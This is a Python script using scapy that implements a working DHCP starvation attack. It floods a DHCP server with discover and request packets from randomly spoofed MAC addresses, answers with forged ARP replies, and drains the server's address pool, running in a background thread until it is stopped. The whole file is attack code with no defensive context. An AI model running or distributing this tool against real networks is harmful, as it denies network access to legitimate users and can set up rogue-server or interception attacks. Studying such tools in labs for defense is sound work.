import random
import threading
from scapy.all import *
from scapy.layers.dhcp import BOOTP, DHCP
from scapy.layers.inet import IP, UDP
from scapy.layers.l2 import Ether, ARP

is_running = False
starve_thread = None


def dhcp_discover(spoofed_mac, i_face):
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    dsc = Ether(src=mac2str(spoofed_mac), dst=mac_dest, type=0x0800)
    dsc /= IP(src='0.0.0.0', dst=ip_dest)
    dsc /= UDP(sport=68, dport=67)
    dsc /= BOOTP(chaddr=mac2str(spoofed_mac),
                 xid=random.randint(1, 1000000000),
                 flags=0xFFFFFF)
    dsc /= DHCP(options=[("message-type", "discover"), "end"])
    sendp(dsc, iface=i_face, verbose=False)
    print("[+] Discover sent")


def dhcp_request(req_ip, spoofed_mac, server_ip, i_face):
    ip_dest = '255.255.255.255'
    mac_dest = "ff:ff:ff:ff:ff:ff"
    req = Ether(src=mac2str(spoofed_mac), dst=mac_dest)
    req /= IP(src="0.0.0.0", dst=ip_dest)
    req /= UDP(sport=68, dport=67)
    req /= BOOTP(chaddr=mac2str(spoofed_mac), xid=random.randint(1, 1000000000))
    req /= DHCP(
        options=[("message-type", "request"),
                 ("server_id", server_ip),
                 ("requested_addr", req_ip),
                 "end"])
    sendp(req, iface=i_face, verbose=False)
    print('[+] Request sent')


def arp_reply(src_ip, source_mac, server_ip, server_mac, i_face):
    reply = ARP(op=2, hwsrc=mac2str(source_mac), psrc=src_ip, hwdst=server_mac, pdst=server_ip)
    send(reply, iface=i_face, verbose=False)


def _starve_loop(target_ip, i_face, persistent):
    global is_running
    cur_ip = 0
    server_mac = None

    if target_ip:
        try:
            ans = sr1(ARP(op=1, pdst=str(target_ip)), timeout=2, verbose=False)
            if ans:
                server_mac = ans[ARP].hwsrc
        except Exception:
            pass

    while is_running:
        counter = 0
        mac = RandMAC()
        dhcp_discover(spoofed_mac=mac, i_face=i_face)

        while is_running:
            p = sniff(count=1, filter="udp and (port 67 or 68)", timeout=3)
            if not is_running:
                break
            if not len(p):
                if not persistent and counter >= 3:
                    print("[-] Finishing attack loop (no replies)")
                    return
                counter += 1
                dhcp_discover(spoofed_mac=mac, i_face=i_face)
                continue

            if DHCP in p[0]:
                if p[0][DHCP].options[0][1] == 2:
                    ip = p[0][BOOTP].yiaddr
                    src = p[0][IP].src
                    if not target_ip and not src == cur_ip:
                        cur_ip = src
                        try:
                            ans = sr1(ARP(op=1, pdst=str(src)), timeout=2, verbose=False)
                            if ans:
                                server_mac = ans[ARP].hwsrc
                        except Exception:
                            pass
                    if src == target_ip or not target_ip:
                        break
                    continue

        if not is_running:
            break

        target_server = target_ip if target_ip != 0 else cur_ip
        dhcp_request(req_ip=str(ip), spoofed_mac=mac, server_ip=str(target_server), i_face=i_face)
        if server_mac:
            arp_reply(src_ip=str(ip), source_mac=mac, server_ip=str(target_server), server_mac=server_mac,
                      i_face=i_face)


def start_starve(target_ip=0, i_face=conf.iface, persistent=False):
    global is_running, starve_thread
    is_running = True
    starve_thread = threading.Thread(
        target=_starve_loop,
        args=(target_ip, i_face, persistent),
        daemon=True
    )
    starve_thread.start()
    print(f"[*] DHCP Starvation running against target: {target_ip or 'Auto'}")
    input("Press Enter to stop...\n")
    stop_starve()


def stop_starve():
    global is_running
    is_running = False
    print("[+] DHCP Starvation stopped.")